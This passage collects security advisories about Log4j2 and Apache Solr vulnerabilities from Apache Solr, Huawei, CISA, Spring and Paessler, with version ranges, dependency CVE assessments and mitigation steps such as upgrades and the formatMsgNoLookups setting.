  `SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"`
* (Windows) Edit your `solr.in.cmd` file to include:
  `set SOLR_OPTS=%SOLR_OPTS% -Dlog4j2.formatMsgNoLookups=true`
* Follow any of the other mitgations listed at <https://logging.apache.org/log4j/2.x/security.html>

The Log4J security page refers to setting `log4j2.formatMsgNoLookups=true` as a "discredited" mitigation. In reality, it depends.
We've looked at the root cause and audited the code paths that lead to the vulnerability, and we feel confident in this mitigation being sufficient for Solr.
See <https://lists.apache.org/thread/kgh63sncrsm2bls884pg87mnt8vqztmz> for discussion.

**Severity:**
High

**Versions Affected:**
7.0.0 to 7.7.3
8.0.0 to 8.8.1

**Description:**
The ReplicationHandler (normally registered at "/replication" under a Solr core) has a "masterUrl" (also "leaderUrl" alias) parameter that is used to designate another ReplicationHandler on another Solr core to replicate index data into the local core.
To prevent a SSRF vulnerability, Solr ought to check these parameters against a similar configuration it uses for the "shards" parameter. Prior to this bug getting fixed, it did not.

**Mitigation:**
Any of the following are enough to prevent this vulnerability:

* Upgrade to `Solr 8.8.2` or greater.
* If upgrading is not an option, consider applying the patch in [SOLR-15217](https://issues.apache.org/jira/browse/SOLR-15217)
* Ensure that any access to the replication handler is purely internal to Solr. Typically, it's only accessed externally for diagnostic/informational purposes.

**Severity:**
High

**Versions Affected:**
7.0.0 to 7.7.3
8.0.0 to 8.8.1

**Description:**
When starting Apache Solr versions prior to 8.8.2, configured with the SaslZkACLProvider or VMParamsAllAndReadonlyDigestZkACLProvider and no existing security.json znode, if the optional read-only user is configured then Solr would not treat that node as a sensitive path and would allow it to be readable.
Additionally, with any ZkACLProvider, if the security.json is already present, Solr will not automatically update the ACLs.

**Mitigation:**
Any of the following are enough to prevent this vulnerability:

* Manually set appropriate ACLs on /security.json znode.
* Upgrade to `Solr 8.8.2` or greater.
* If upgrading is not an option, consider applying the patch in [SOLR-15249](https://issues.apache.org/jira/browse/SOLR-15249)

* Upgrade to `Solr 8.8.2` or greater.
* If upgrading is not an option, consider applying the patch in [SOLR-15233](https://issues.apache.org/jira/browse/SOLR-15233)

## 2020-10-12, CVE-2020-13957: The checks added to unauthenticated configset uploads in Apache Solr can be circumvented [Â¶](#cve-2020-13957-the-checks-added-to-unauthenticated-configset-uploads-in-apache-solr-can-be-circumvented "Permanent link")

**Severity:**
High

**Versions Affected:**
6.6.0 to 6.6.6
7.0.0 to 7.7.3
8.0.0 to 8.6.2

**Description:**
Solr prevents some features considered dangerous (which could be used for remote code execution) to be configured in a ConfigSet that's uploaded via API without authentication/authorization. The checks in place to prevent such features can be circumvented by using a combination of UPLOAD/CREATE actions.

**Mitigation:**
Any of the following are enough to prevent this vulnerability:

* Disable UPLOAD command in ConfigSets API if not used by setting the system property: `configset.upload.enabled` to `false` ([see docs](https://solr.apache.org/guide/8_6/configsets-api.html))
* Use Authentication/Authorization and make sure unknown requests aren't allowed ([see docs](https://solr.apache.org/guide/8_6/authentication-and-authorization-plugins.html))
* Upgrade to `Solr 8.6.3` or greater.
* If upgrading is not an option, consider applying the patch in [SOLR-14663](https://issues.apache.org/jira/browse/SOLR-14663)
* No Solr API, including the Admin UI, is designed to be exposed to non-trusted parties. Tune your firewall so that only trusted computers and people are allowed access

# CVE reports for Apache Solr dependencies

Below is a list of CVE vulnerabilities in Apache Solr dependencies, and the state of their applicability to Solr.

We are currently experimenting with providing this information in a [machine-readable VEX format](#vex) and encourage you to participate.

| id | versions | jars | state | detail |
| --- | --- | --- | --- | --- |
| [CVE-2022-33980](https://nvd.nist.gov/vuln/detail/CVE-2022-33980) | < 9.1 | commons-configuration2-2.7.jar | not affected | Solr uses commons-configuration2 for "hadoop-auth" only (for Kerberos). It is only used for loading Hadoop configuration files that would only ever be provided by trusted administrators, not externally (untrusted). |
| [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889) | < 9.1 | commons-text-1.9.jar | not affected | Solr uses commons-text directly (StringEscapeUtils.escapeEcmaScript) in LoadAdminUiServlet that is not vulnerable. Solr also has a "hadoop-auth" module that uses Apache Hadoop which uses commons-text through commons-configuration2. For Solr, the concern is limited to loading Hadoop configuration files that would only ever be provided by trusted administrators, not externally (untrusted). |
| [CVE-2022-25168](https://nvd.nist.gov/vuln/detail/CVE-2022-25168) | < 9.1 | hadoop-common-3.2.2.jar | not affected | The vulnerable code won't be used by Solr because Solr only is only using HDFS as a client. |
| [CVE-2021-44832](https://nvd.nist.gov/vuln/detail/CVE-2021-44832) | 7.4-8.11.1 | log4j-core-2.14.1.jar, log4j-core-2.16.0.jar | not affected | Solr's default log configuration doesn't use JDBCAppender and we don't imagine a user would want to use it or other obscure appenders. |
| [CVE-2021-45105](https://nvd.nist.gov/vuln/detail/CVE-2021-45105), [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) | 7.4-8.11.1 | log4j-core-2.14.1.jar, log4j-core-2.16.0.jar | not affected | The MDC data used by Solr are for the collection, shard, replica, core and node names, and a potential trace id, which are all sanitized. Furthermore, Solr's default log configuration doesn't use double-dollar-sign and we don't imagine a user would want to do that. |
| [CVE-2020-13955](https://nvd.nist.gov/vuln/detail/CVE-2020-13955) | 8.1.0- today | avatica-core-1.13.0.jar, calcite-core-1.18.0.jar | not affected | Solr's SQL adapter does not use the vulnerable class "HttpUtils". Calcite only used it to talk to Druid or Splunk. |
| [CVE-2018-10237](https://nvd.nist.gov/vuln/detail/CVE-2018-10237) | 5.4.0-today | carrot2-guava-18.0.jar | not affected | Only used with the Carrot2 clustering engine. |
| [CVE-2014-0114](https://nvd.nist.gov/vuln/detail/CVE-2014-0114) | 4.9.0-7.5.0 | commons-beanutils-1.8.3.jar | not affected | This is only used at compile time and it cannot be used to attack Solr. Since it is generally unnecessary, the dependency has been removed as of 7.5.0. See SOLR-12617. |
| [CVE-2019-10086](https://nvd.nist.gov/vuln/detail/CVE-2019-10086) | 8.0.0-8.3.0 | commons-beanutils-1.9.3.jar | not affected | While commons-beanutils was removed in 7.5, it was added back in 8.0 in error and removed again in 8.3. The vulnerable class was not used in any Solr code path. This jar remains a dependency of both Velocity and hadoop-common, but Solr does not use it in our implementations. |
| [CVE-2012-2098](https://nvd.nist.gov/vuln/detail/CVE-2012-2098), [CVE-2018-1324](https://nvd.nist.gov/vuln/detail/CVE-2018-1324), [CVE-2018-11771](https://nvd.nist.gov/vuln/detail/CVE-2018-11771) | 4.6.0-today | commons-compress (only as part of Ant 1.8.2) | not affected | Only used in test framework and at build time. |
| [CVE-2018-1000632](https://nvd.nist.gov/vuln/detail/CVE-2018-1000632) | 4.6.0-today | dom4j-1.6.1.jar | not affected | Only used in Solr tests. |
| [CVE-2018-10237](https://nvd.nist.gov/vuln/detail/CVE-2018-10237) | 4.6.0-today | guava-\*.jar | not affected | Only used in tests. |
| [CVE-2017-15718](https://nvd.nist.gov/vuln/detail/CVE-2017-15718) | 6.6.1-7.6.0 | hadoop-auth-2.7.4.jar, hadoop-hdfs-2.7.4.jar (all Hadoop) | not affected | Does not impact Solr because Solr uses Hadoop as a client library. |
| [CVE-2017-14952](https://nvd.nist.gov/vuln/detail/CVE-2017-14952) | 6.0.0-7.5.0 | icu4j-56.1.jar, icu4j-59.1.jar | not affected | Issue applies only to the C++ release of ICU and not ICU4J, which is what Lucene uses. ICU4J is at v63.2 as of Lucene/Solr 7.6.0 |
| [CVE-2017-15095](https://nvd.nist.gov/vuln/detail/CVE-2017-15095), [CVE-2017-17485](https://nvd.nist.gov/vuln/detail/CVE-2017-17485), [CVE-2017-7525](https://nvd.nist.gov/vuln/detail/CVE-2017-7525), [CVE-2018-5968](https://nvd.nist.gov/vuln/detail/CVE-2018-5968), [CVE-2018-7489](https://nvd.nist.gov/vuln/detail/CVE-2018-7489), [CVE-2019-12086](https://nvd.nist.gov/vuln/detail/CVE-2019-12086), [CVE-2019-12384](https://nvd.nist.gov/vuln/detail/CVE-2019-12384), [CVE-2018-12814](https://nvd.nist.gov/vuln/detail/CVE-2018-12814), [CVE-2019-14379](https://nvd.nist.gov/vuln/detail/CVE-2019-14379), [CVE-2019-14439](https://nvd.nist.gov/vuln/detail/CVE-2019-14439), [CVE-2020-35490](https://nvd.nist.gov/vuln/detail/CVE-2020-35490), [CVE-2020-35491](https://nvd.nist.gov/vuln/detail/CVE-2020-35491), [CVE-2021-20190](https://nvd.nist.gov/vuln/detail/CVE-2021-20190), [CVE-2019-14540](https://nvd.nist.gov/vuln/detail/CVE-2019-14540), [CVE-2019-16335](https://nvd.nist.gov/vuln/detail/CVE-2019-16335) | 4.7.0-today | jackson-databind-\*.jar | not affected | These CVEs, and most of the known jackson-databind CVEs since 2017, are all related to problematic 'gadgets' that could be exploited during deserialization of untrusted data. The Jackson developers described 4 conditions that must be met in order for a problematic gadget to be exploited. See [https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062](https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062). Solr's use of jackson-databind does not meet 1 of the 4 conditions described which makes these CVEs unexploitable. The specific condition that Solr does not meet is the 3rd one: 'Enable polymorphic type handling' Solr does not include any polymorphic type handling, and Solr does not configure jackson-databind de/serialization to expect or include class names in serialized JSON. Two CVEs, 2019-14540 & 2019-16335, are related to HikariConfig and HikariDataSource classes, neither of which are used in Solr's code base. |
| [CVE-2019-10241](https://nvd.nist.gov/vuln/detail/CVE-2019-10241), [CVE-2019-10247](https://nvd.nist.gov/vuln/detail/CVE-2019-10247) | 7.7.0-8.2 | jetty-9.4.14 | not affected | Solr upgraded to Jetty 9.4.19 for the 8.2 release. Additionally, the path to exploit these vulnerabilities was fixed in 8.1 and 7.7.2. Earlier versions can manually patch their configurations as described in SOLR-13409. |
| [CVE-2020-27218](https://nvd.nist.gov/vuln/detail/CVE-2020-27218) | 7.3.0-8.8.0 | jetty-9.4.0 to 9.4.34 | not affected | Only exploitable through use of Jetty's GzipHandler, which is only implemented in Embedded Solr Server. |
| [CVE-2020-27223](https://nvd.nist.gov/vuln/detail/CVE-2020-27223) | 7.3.0-present | jetty-9.4.6 to 9.4.36 | not affected | Only exploitable if Solr's webapp directory is deployed as a symlink, which is not Solr's default. |
| [CVE-2021-33813](https://nvd.nist.gov/vuln/detail/CVE-2021-33813) | to present | jdom-\*.jar | not affected | JDOM is only used in Solr Cell, which should not be used in production which makes the vulnerability unexploitable. It is a dependency of Apache Tika, which has analyzed the issue and determined the vulnerability is limited to two libraries not commonly used in search applications, see TIKA-3488 for details. Since Tika should be used outside of Solr, use a version of Tika which updates the affected libraries if concerned about exposure to this issue. |
| [CVE-2018-1000056](https://nvd.nist.gov/vuln/detail/CVE-2018-1000056) | 4.6.0-7.6.0 | junit-4.10.jar | not affected | JUnit only used in tests; CVE only refers to a Jenkins plugin not used by Solr. |
| [CVE-2014-7940](https://nvd.nist.gov/vuln/detail/CVE-2014-7940), [CVE-2016-6293](https://nvd.nist.gov/vuln/detail/CVE-2016-6293), [CVE-2016-7415](https://nvd.nist.gov/vuln/detail/CVE-2016-7415), [CVE-2017-14952](https://nvd.nist.gov/vuln/detail/CVE-2017-14952), [CVE-2017-17484](https://nvd.nist.gov/vuln/detail/CVE-2017-17484), [CVE-2017-7867](https://nvd.nist.gov/vuln/detail/CVE-2017-7867), [CVE-2017-7868](https://nvd.nist.gov/vuln/detail/CVE-2017-7868) | 7.3.1 | lucene-analyzers-icu-7.3.1.jar | not affected | All of these issues apply to the C++ release of ICU and not ICU4J, which is what Lucene uses. |
| [CVE-2019-16869](https://nvd.nist.gov/vuln/detail/CVE-2019-16869) | 8.2-8.3 | netty-all-4.1.29.Final.jar | not affected | This is not included in Solr but is a dependency of ZooKeeper 3.5.5. The version was upgraded in ZooKeeper 3.5.6, included with Solr 8.3. The specific classes mentioned in the CVE are not used in Solr (nor in ZooKeeper as far as the Solr community can determine). |
| [CVE-2017-14868](https://nvd.nist.gov/vuln/detail/CVE-2017-14868), [CVE-2017-14949](https://nvd.nist.gov/vuln/detail/CVE-2017-14949) | 5.2.0-today | org.restlet-2.3.0.jar | not affected | Solr should not be exposed outside a firewall where bad actors can send HTTP requests. These two CVEs specifically involve classes (SimpleXMLProvider and XmlRepresentation, respectively) that Solr does not use in any code path. |
| [CVE-2015-5237](https://nvd.nist.gov/vuln/detail/CVE-2015-5237) | 6.5.0-today | protobuf-java-3.1.0.jar | not affected | Dependency for Hadoop and Calcite. ?? |
| [CVE-2018-1471](https://nvd.nist.gov/vuln/detail/CVE-2018-1471) | 5.4.0-7.7.2, 8.0-8.3 | simple-xml-2.7.1.jar | not affected | Dependency of Carrot2 and used during compilation, not at runtime (see SOLR-769. This .jar was replaced in Solr 8.3 and backported to 7.7.3 (see SOLR-13779). |
| [CVE-2018-8088](https://nvd.nist.gov/vuln/detail/CVE-2018-8088) | 4.x-today | slf4j-api-1.7.24.jar, jcl-over-slf4j-1.7.24.jar, jul-to-slf4j-1.7.24.jar | not affected | The reported CVE impacts org.slf4j.ext.EventData, which is not used in Solr. |
| [CVE-2018-1335](https://nvd.nist.gov/vuln/detail/CVE-2018-1335) | 7.3.1-7.5.0 | tika-core.1.17.jar | not affected | Solr does not run tika-server, so this is not a problem. |
| [CVE-](https://nvd.nist.gov/vuln/detail/CVE-) | 7.3.1-today | tika-core.\*.jar | not affected | All Tika issues that could be Solr vulnerabilities would only be exploitable if untrusted files are indexed with SolrCell. This is not recommended in production systems, so Solr does not consider these valid CVEs for Solr. |
| [CVE-](https://nvd.nist.gov/vuln/detail/CVE-) | 6.6.2-today | velocity-tools-2.0.jar | not affected | Solr does not ship a Struts jar. This is a transitive POM listing and not included with Solr (see comment in SOLR-2849). |
| [CVE-2016-6809](https://nvd.nist.gov/vuln/detail/CVE-2016-6809), [CVE-2018-1335](https://nvd.nist.gov/vuln/detail/CVE-2018-1335), [CVE-2018-1338](https://nvd.nist.gov/vuln/detail/CVE-2018-1338), [CVE-2018-1339](https://nvd.nist.gov/vuln/detail/CVE-2018-1339) | 5.5.5, 6.2.0-today | vorbis-java-tika-0.8.jar | not affected | See <https://github.com/Gagravarr/VorbisJava/issues/30>; reported CVEs are not related to OggVorbis at all. |
| [CVE-2012-0881](https://nvd.nist.gov/vuln/detail/CVE-2012-0881) | ~2.9-today | xercesImpl-2.9.1.jar | not affected | Only used in Lucene Benchmarks and Solr tests. |
| [CVE-2023-51074](https://nvd.nist.gov/vuln/detail/CVE-2023-51074), GHSA-pfh2-hfmq-phg5 | all | json-path-2.8.0.jar | not affected | The only places we use json-path is for querying (via Calcite) and for transforming/indexing custom JSON. Since the advisory describes a problem that is limited to the current thread, and users that are allowed to query/transform/index are already trusted to cause load to some extent, this advisory does not appear to have impact on the way json-path is used in Solr. |

# Security Notice – Statement About Apache Log4j2 Vulnerabilities

* SA No:huawei-sn-20211210-01-log4j2
* Initial Release Date:
  2021-12-10
* Last Release Date:
  2021-12-23

Security Notice

Huawei has noticed that since December 9, the Apache official website has disclosed the Apache Log4j2 remote code execution vulnerability CVE-2021-44228, followed by the CVE-2021-45046 and CVE-2021-45105 vulnerabilities.

These vulnerabilities can be remotely exploited. To prevent these vulnerabilities, you are advised to immediately deploy protection mechanisms, such as firewall, on devices directly exposed to the Internet. If you have deployed Huawei Next-Generation Firewall (NGFW) or data center firewall products, you can upgrade the IPS signature database to the latest version (IPS\_H20011000\_2021122200) released on December 22, 2021 to detect and defend against network-layer attacks.

Huawei is in an ongoing investigation. This SN is released based on Huawei's current investigation results and is subject to changes. Huawei PSIRT will update this SN as new information emerges, Please stay tuned.

For products that have released software updates to fix these vulnerabilities, Huawei will release and update the Security Advisory (SA) at: <https://www.huawei.com/en/psirt/security-advisories/huawei-sa-20211215-01-log4j-en>

**Common Questions:**

**1.What are the impacts of the three Log4j2 vulnerabilities?**

December 9: In some Apache Log4j2 versions, the JNDI function may be abused due to insufficient JNDI protection. (CVE ID: CVE-2021-44228)

December 14: This vulnerability could bypass the fix to the CVE-2021-44228 vulnerability. As a result, the JNDI function may still be abused in some special configurations. (CVE ID: CVE-2021-45046)

December 18: Some Apache Log4j2 versions did not protect from uncontrolled recursion from self-referential lookups. (CVE ID: CVE-2021-45105)

For description of these vulnerabilities, see the Apache Log4j2 Security Vulnerabilities page at <https://logging.apache.org/log4j/2.x/security.html>.

**2. Which Huawei products are affected by these vulnerabilities?**

Huawei uses common standards in the industry, assess the severity of vulnerabilities to reflect the real impact of the vulnerabilities, based on the methods and scenarios of integrating third-party software into Huawei products. Up to now, scenarios where Huawei products directly use the Log4j2 software have been assessed.

As a piece of underlying open-source software, Log4j2 is used by a large number of other open-source software (such as Apache Solr and Apache Flink) and Huawei's suppliers. We are actively communicating and cooperating with the community and suppliers to further assess the potential impact on Huawei products.

In the entire vulnerability handling process, Huawei shall strictly control the scope of vulnerability information and transfer the information only between necessary personnel who handle the vulnerabilities. In line with the principle of reducing harm and risks, carrier customers can contact the [Carrier TAC](https://support.huawei.com/carrier/docview%21docview?nid=IN0000034614&path=NN-000005v), enterprise customers can contact the [Enterprise TAC](https://e.huawei.com/en/service-hotline-query) and partners can log in to the [Support-E](https://support.huawei.com/enterprise/en/bulletins-product/vulnerability-notices) website to query the impact details.

**3. How will Huawei support you in vulnerability mitigation?**

Huawei's top priority is to provide patches/versions as soon as possible to fix these vulnerabilities, and preferentiality upgrade to Apache Log4j 2.17.0 to completely fix the vulnerabilities. So far, almost all affected Huawei products provided with patching plans or have been patched, and most of the products have provided temporary mitigation measures to minimize the impact. For the patch plans and mitigation measures, carrier customers can contact the [Carrier TAC](https://support.huawei.com/carrier/docview%21docview?nid=IN0000034614&path=NN-000005v), enterprise customers can contact the [Enterprise TAC](https://e.huawei.com/en/service-hotline-query) and partners can log in to the [Support-E](https://support.huawei.com/enterprise/en/bulletins-product/vulnerability-notices) website to query the details.

In addition, Huawei recommends that you take appropriate security protection measures based on risk assessment to mitigate the impact of vulnerabilities.For assets directly exposed to the Internet, you are advised to immediately deploy protection mechanisms (such as firewall, WAF, and RASP) and promptly take mitigation measures for corresponding products to reduce the impact of the vulnerabilities. Finally,you need to install the patches/versions to completely fix the vulnerabilities. For intranet assets, we suggest that you assess the risks based on the asset importance, threat information, and severity, and preferentially deploy protection mechanisms (such as RASP) and product mitigation measures. After the patches/versions are released, you should install them.

If you have deployed Huawei Next-Generation Firewall (NGFW) or data center firewall products, you can upgrade the IPS signature database to the latest version (IPS\_H20011000\_2021122200) released on December 22, 2021 to detect and defend against network-layer attacks. If you are tenant on Cloud, Huawei has provided security protection cloud services, such as vulnerability detection and blocking. To further help tenants mitigate risks, Huawei allows its enants to enjoy the one-month free use of the WAF protection service to help them secure their applications and win more time for vulnerability fixing.

**4. Will Huawei provide support for EOS products?**

Huawei is dedicated to providing patches or version updates for non-EOS products and will not provide information about EOS versions in security bulletins.

**5. Has Huawei detected vulnerability exploits?**

Huawei PSIRT is aware that the industry has disclosed the exploit code of the Apache Log4j2 vulnerabilities. We recommend that carrier customers contact the [Carrier TAC](https://support.huawei.com/carrier/docview%21docview?nid=IN0000034614&path=NN-000005v), enterprise customers contact the [Enterprise TAC](file:///C%3A/Users/g00525493/AppData/Roaming/eSpace_Desktop/UserData/g00525493/ReceiveFile/Security%20Notice%20%E2%80%93%20Statement%20About%20Apache%20Log4j2%20Vulnerabilities%20CVE-2021-44228%20and%20CVE-2021-45046%20V1.3.docx) and partners log in to the [Support-E](https://support.huawei.com/enterprise/en/bulletins-product/vulnerability-notices) website to obtain mitigation suggestions.

Huawei has deployed security protection mechanisms, such as firewall, WAF, and RASP, on its own IT network immediately to protect the system and network. So far, Huawei has not detected any successful attempt to exploit these vulnerabilities on Huawei networks.

**6. Are Huawei Cloud services affected?**

Huawei Cloud services have immediately deployed security protection mechanisms such as WAF to protect systems and networks. Currently, all attack attempts are blocked, and the cloud services are running properly.

For tenants on Cloud, Huawei has promptly released the vulnerability notification and provided security protection cloud services, such as vulnerability detection and blocking. To further help cloud tenants mitigate risks, Huawei allows its cloud tenants to enjoy the one-month free use of the WAF protection service to help them secure their applications and win more time for vulnerability fixing.

Press Release
# Statement from CISA Director Easterly on “Log4j” Vulnerability

ReleasedDecember 11, 2021

RevisedDecember 11, 2021

WASHINGTON – Cybersecurity and Infrastructure Security Agency (CISA) Director Jen Easterly released the following statement today on the “log4j” vulnerability:

“CISA is working closely with our public and private sector partners to proactively address a critical vulnerability affecting products containing the log4j software library. This vulnerability, which is being widely exploited by a growing set of threat actors, presents an urgent challenge to network defenders given its broad use. End users will be reliant on their vendors, and the vendor community must immediately identify, mitigate, and patch the wide array of products using this software.  Vendors should also be communicating with their customers to ensure end users know that their product contains this vulnerability and should prioritize software updates.

“We are taking urgent action to drive mitigation of this vulnerability and detect any associated threat activity. We have added this vulnerability to our catalog of known exploited vulnerabilities, which compels federal civilian agencies -- and signals to non-federal partners -- to urgently patch or remediate this vulnerability. We are proactively reaching out to entities whose networks may be vulnerable and are leveraging our scanning and intrusion detection tools to help government and industry partners identify exposure to or exploitation of the vulnerability.

“The Joint Cyber Defense Collaborative is designed to manage this kind of risk. We have established a JCDC senior leadership group to coordinate collective action and ensure shared visibility into both the prevalence of this vulnerability and threat activity. By bringing together key government and private sector partners via the JCDC, including our partners at the FBI and NSA, we will ensure that our country’s strongest capabilities are brought to bear in an integrated manner against this risk. To ensure the broadest possible dissemination of key information, we are also convening a national call with critical infrastructure stakeholders on Monday afternoon where CISA’s experts provide further insight and address questions.

“We continue to urge all organizations to review the latest CISA current activity alert and upgrade to log4j version 2.15.0, or apply their appropriate vendor recommended mitigations immediately.

“To be clear, this vulnerability poses a severe risk. We will only minimize potential impacts through collaborative efforts between government and the private sector. We urge all organizations to join us in this essential effort and take action.”

CISA recommends asset owners take three additional, immediate steps regarding this vulnerability:

   1. Enumerate any external facing devices that have log4j installed.

   2. Make sure that your security operations center is actioning every single alert on the devices that fall into the category above.

   3. Install a web application firewall (WAF) with rules that automatically update so that your SOC is able to concentrate on fewer alerts.

This effort also underscores the urgency of building software securely from the start and more widespread use of Software Bill of Materials (SBOM), both of which were directed by President Biden in his Executive Order issued in May 2021.  A SBOM would provide end users will the transparency they require to know if their products rely on vulnerable software libraries.

# Log4J2 Vulnerability and Spring Boot

[Engineering](/blog/category/engineering) | [Phil Webb](/team/philwebb) |  December 10, 2021 | [...](/blog/2021/12/10/log4j2-vulnerability-and-spring-boot#disqus_thread)
> **Updates**: Since this blog post has been published, a [new logback 1.2.9 version has been published](https://logback.qos.ch/news.html). While this fixes a security issue, prerequisites for exploits are very different as they "requires write access to logback's configuration file".
> Log4J also released a new 2.17.0 version with fixes for [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) and [CVE-2021-45105](https://nvd.nist.gov/vuln/detail/CVE-2021-45105).
> Spring Boot `2.5.8` and `2.6.2` haven been released and provide dependency management for logback 1.2.9 and Log4J 2.17.0.
> Log4J 2.17.1 contains a fix for [CVE-2021-44832](https://nvd.nist.gov/vuln/detail/CVE-2021-44832)

As you may have seen in the news, a new zero-day exploit has been reported against the popular Log4J2 library which can allow an attacker to remotely execute code. The vulnerability has been reported with [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) against the `log4j-core` jar and has been fixed in [Log4J v2.15.0](https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.15.0/).

Spring Boot users are only affected by this vulnerability if they have [switched the default logging system to Log4J2](https://docs.spring.io/spring-boot/docs/current/reference/html/howto.html#howto.logging.log4j). The `log4j-to-slf4j` and `log4j-api` jars that we include in `spring-boot-starter-logging` cannot be exploited on their own. Only applications using `log4j-core` and including user input in log messages are vulnerable.

Our upcoming v2.5.8 & v2.6.2 releases (due Dec 23, 2021) will pick up Log4J v2.17.0, but since this is such a serious vulnerability you may want to override our dependency management and upgrade your Log4J2 dependency sooner.

## Maven

For Maven users, you can follow [these instructions](https://docs.spring.io/spring-boot/docs/current/maven-plugin/reference/htmlsingle/#using) and the set the `log4j2.version` property.

For example, if you are using our parent POM you can set the `log4j2.version` property:

```
<properties>
    <log4j2.version>2.17.1</log4j2.version>
</properties>

```

If you are not using our parent, but instead are importing the `spring-boot-dependencies` BOM, you'll need to use a `<dependencyManagement>` section:

```
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-bom</artifactId>
            <version>2.17.1</version>
            <scope>import</scope>
            <type>pom</type>
        </dependency>
        ... other dependencies including spring-boot-dependencies
    </dependencies>
</dependencyManagement>

```

To check that the override as been applied run `./mvnw dependency:list | grep log4j` and check that the version is 2.17.1.

## Gradle

For Gradle users, you can follow [these instructions](https://docs.spring.io/spring-boot/docs/current/gradle-plugin/reference/htmlsingle/#managing-dependencies.dependency-management-plugin.customizing) and update the version property, import the BOM or use a`resolutionStrategy`.

For most users, setting the `log4j2.version` property will be sufficient:

```
ext['log4j2.version'] = '2.17.1'

```

If you're using Gradle's platform support instead of our dependency management plugin then you can add a dependency to the Log4J BOM:

```
implementation(platform("org.apache.logging.log4j:log4j-bom:2.17.1"))

```

And if you can’t use either of those methods then you can declare a `resolutionStrategy`:

```
configurations.all {
	resolutionStrategy.eachDependency { DependencyResolveDetails details ->
		if (details.requested.group == 'org.apache.logging.log4j') {
			details.useVersion '2.17.1'
		}
	}
}

```

Whichever method you choose, to check that the override has been applied you can run `./gradlew dependencyInsight --dependency log4j-core` and look for version 2.17.1.

In response to the vulnerability in the **Apache Log4j** library, also known as *Log4Shell*, we at Paessler can confirm that our software Paessler PRTG Network Monitor and Paessler PRTG Hosted Monitor (as well as the underlying infrastructure) does not use this Apache logging component and is therefore **not affected**.

We are also currently conducting a thorough investigation of our internal infrastructure as well as staying in close contact with the manufacturers to ensure that all our services stay secure.

The **Elastic Search Component** of the **ITOPs Board** bundled in our **Paessler PRTG Enterprise Monitor Product** is potentially affected by CVE-2021-44228

---

**Important notice:** The following guidance **only** applies to **Paessler PRTG Enterprise Monitor**. Paessler PRTG Network Monitor, Paessler PRTG Hosted Monitor, and other products of Paessler are **not** subject to the problem described below.

---

If ITOps Board is configured as outlined in our configuration guide ([ITOps Board](https://www.paessler.com/prtg-enterprise-monitor/itops-board)), it includes a deployment of Elasticsearch that runs a potentially vulnerable version of Log4j2 on top of JDK 11.

According to the currently available information, such as *AWS Advisory AWS-2021-006*, we have concluded that using Log4j2 in the included version on JDKs after **8u121** or **8u191** (including JDK **11 and later**) seems to mitigate the issue. However, this may only be a **partial** mitigation.

The recommended solution is to upgrade Log4j2 to **2.17+**. As a precaution, any Log4j2 versions that are older than 2.17 should be considered to be **affected** regardless of the JDK distribution or version used.

## Recommended solution

We've released an updated version 2.11.3 of ITOps Board, that includes elastic search version 6.8.22. Please update as soon as possible. You can find all the needed files [here.](https://downloads.paessler.com/prtg/prtg_enterprise.zip)

## Additional methods

According to the developers of Elasticsearch, you can:

1. Update to a JDK later than **8** to achieve at least partial mitigation.
2. Follow the instructions regarding Elasticsearch from the developer and upgrade to Elasticsearch **6.8.22**, you can find the download link here: [elasticsearch-6-8-22](https://www.elastic.co/downloads/past-releases/elasticsearch-6-8-22)

Furthermore, you can also mitigate the vulnerability via one of the following methods:

1. Disable the *formatMessageLookup* as follows:
   1. Stop the service **Elasticsearch**.
   2. Add *-Dlog4j2.formatMsgNoLookups=true* to the log4j part of *C:\Program Files\Elasticsearch\elasticsearch\config\jvm.options*.
   3. Start the service **Elasticsearch** again.
2. Manually update Log4j2 to version 2.17+ as follows:
   1. Obtain a version of log4j later than 2.17 from the developers on <https://logging.apache.org/log4j/2.x/download.html>
   2. Stop the service **Elasticsearch**.
   3. Deploy an updated version of **log4j-1.2-api-2.xx.y**, **log4j-api-2.xx.y**, and **log4j-core-2.xx.y** to *C:\Program Files\Elasticsearch\elasticsearch\lib* and remove the current version 2.11.0.
   4. Start the service **Elasticsearch** again.
3. **Only** if the website of the ITOpsboard does not work after the changes:
   1. Reset the IIS settings of the ITOpsboard after showing a failure as described [here](https://support.martellotech.com/knowledgeBase/13171886).

**German:**

Als Reaktion auf die Sicherheitslücke in der Apache Log4j Bibliothek, auch bekannt als Log4Shell, können wir bei Paessler bestätigen, dass unsere Software Paessler PRTG Network Monitor und Paessler PRTG Hosted Monitor (sowie die gesamte unterliegende Infrastruktur) diese Apache Logging Komponente nicht verwendet und daher nicht betroffen ist.

Wir führen derzeit eine gründliche Untersuchung unserer internen Infrastruktur durch und stehen in engem Kontakt mit den Herstellern, um zu garantieren, dass alle unsere Dienste sicher bleiben.

Die **Elastic Search-Komponente** des **ITOPs Boards**, das in unserem **Paessler PRTG Enterprise Monitor Produkt** enthalten ist, ist möglicherweise von CVE-2021-44228 betroffen.

---

**Wichtiger Hinweis**: Die folgende Anleitung gilt **ausschließlich** für **Paessler PRTG Enterprise Monitor**. Paessler PRTG Network Monitor, Paessler PRTG Hosted Monitor und andere Produkte von Paessler sind nicht von dem unten beschriebenen Problem betroffen.

---

Wenn das ITOps Board wie in unserer Konfigurationsanleitung ([ITOps Board](https://www.paessler.com/prtg-enterprise-monitor/itops-board)) konfiguriert ist, enthält es eine Instanz von Elasticsearch, die eine potenziell anfällige Version von Log4j2 auf JDK 11 beinhaltet.

Mit den derzeitig verfügbaren Informationen, wie z.B. *AWS Advisory AWS-2021-006*, sind wir zu dem Schluss gekommen, dass die Verwendung von Log4j2 in der mitgelieferten Version auf JDKs nach **8u121** oder **8u191** (einschließlich JDK **11 und später**) das Problem zu entschärfen scheint. Dies ist jedoch möglicherweise nur ein *Teilschritt* zur kompletten Mitigation.

